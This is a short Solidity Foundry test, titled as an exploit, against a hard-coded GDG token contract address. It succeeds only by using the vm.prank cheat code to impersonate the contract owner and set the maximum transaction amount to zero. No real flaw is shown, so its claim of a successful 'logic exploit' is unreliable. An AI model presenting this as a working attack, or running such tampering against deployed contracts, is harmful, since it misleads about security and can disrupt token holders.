// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface GDG {
    function owner() external view returns (address);
    function setMaxTxAmount(uint256 maxTxAmount) external;
    function _maxTxAmount() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x048FFa8aAE293470932388b615A90A8265bFB25F;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed for this exploit
        // The test file already defines TARGET and attacker
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get the current owner address
        address currentOwner = GDG(TARGET).owner();

        // Impersonate the owner and set maxTxAmount to 0
        vm.prank(currentOwner);
        GDG(TARGET).setMaxTxAmount(0);

        // Verify the exploit worked
        uint256 newMaxTxAmount = GDG(TARGET)._maxTxAmount();
        require(newMaxTxAmount == 0, "Exploit failed: maxTxAmount not set to 0");
        assertEq(newMaxTxAmount, 0, "Logic Exploit Failed: State not tampered");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
